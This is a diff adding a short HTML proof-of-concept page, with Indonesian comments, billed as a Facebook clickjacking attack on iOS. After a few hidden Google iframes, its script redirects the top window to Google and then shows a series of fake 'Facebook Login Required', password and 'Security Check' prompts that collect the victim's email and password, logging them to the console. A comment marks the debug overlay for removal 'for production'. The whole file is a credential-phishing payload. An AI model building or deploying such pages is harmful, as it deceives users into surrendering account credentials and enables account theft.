@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html><body>
+<h2>PoC: Facebook iOS Clickjacking + Prompt</h2>
+<!-- Multiple iframe warmups untuk bypass iOS rendering block -->
+<iframe src="https://www.google.com" style="display:none;"></iframe>
+<iframe src="https://www.google.com" style="display:none;"></iframe>
+<iframe src="https://www.google.com/favicon.ico" style="display:none;"></iframe>
+
+<script>
+setTimeout(() => {
+  // Step 1: Redirect ke visible Google homepage (content akan muncul)
+  top.location = "https://www.google.com";
+  
+  setTimeout(() => {
+    // Step 2: Focus window + delay lebih lama untuk iOS rendering
+    window.focus();
+    
+    setTimeout(() => {
+      // Step 3: Multiple prompts dengan fake Facebook context
+      prompt("Facebook Login Required", "Enter Email");
+      prompt("Facebook Password", "Enter Password");
+      
+      // Step 4: Final overlay prompt (capture combined creds)
+      const creds = prompt("Facebook Security Check", "Email:Password");
+      console.log("Captured:", creds);
+      
+    }, 1200); // 1.2s delay untuk iOS prompt rendering
+    
+  }, 2000); // 2s delay untuk page load + rendering
+  
+}, 500); // Initial warmup delay
+</script>
+
+<!-- Debug info (hapus untuk production) -->
+<div style="position:fixed; top:10px; right:10px; background:rgba(0,0,0,0.8); color:white; padding:5px; font-size:12px; z-index:9999;">
+  Debug: Wait 3s → Google loads → Prompts appear
+</div>
+</body></html>
